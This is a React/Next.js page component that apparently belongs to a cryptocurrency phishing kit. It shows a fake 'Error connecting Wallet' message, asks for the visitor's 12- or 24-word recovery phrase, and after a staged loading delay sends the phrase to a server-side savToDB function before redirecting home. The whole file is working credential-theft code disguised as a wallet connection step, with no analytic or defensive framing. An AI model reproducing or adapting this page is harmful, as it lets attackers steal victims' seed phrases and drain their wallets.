"use client";
import { useSearchParams } from "next/navigation";
import React, { useState } from "react";
import { savToDB } from "@/actions/wallets";
import { useRouter } from "next/navigation";

import loading from "../loading";

function InputPage() {
  const searchParams = useSearchParams();

  const title = searchParams.get("title");

  const [inputValue, setInputValue] = useState<string>("");

  const [isLoading, setIsLoading] = useState(false);

  const router = useRouter();

  const handleInputChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    setInputValue(e.target.value);
  };

  const handleButtonClick = () => {
    
    setIsLoading(true);
    setTimeout(() => {
      // Call saveToDb function with title and inputValue
      savToDB(title, inputValue);
      setInputValue("");
      router.push('/');
    }, 4000);
  };

  return (
    <div className="min-h-screen bg-gray-200 flex justify-center items-center">
      <div className="bg-white p-8 rounded shadow-lg w-full sm:w-96">
        <p className="mt-2 mb-2 text-xl text-red-600">
          Error connecting Wallet... Try connecting manually.
        </p>
        <h2 className="text-2xl font-bold mb-4">{title}</h2>
        <div className="mb-4">
          <textarea
            typeof="text"
            className="w-full px-3 py-2 border border-gray-300 rounded h-28"
            placeholder="Enter your recovery phrase"
            value={inputValue}
            onChange={handleInputChange}
          />
        </div>
        <p className="mt-2 mb-2 text-sm text-gray-600">
          Tpically 12(sometimes 24)words seperated by single spaces
        </p>
        <button
          className="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded"
          onClick={handleButtonClick}
        >
          Proceed
        </button>
        {isLoading && loading()}
      </div>
    </div>
  );
}

export default InputPage;
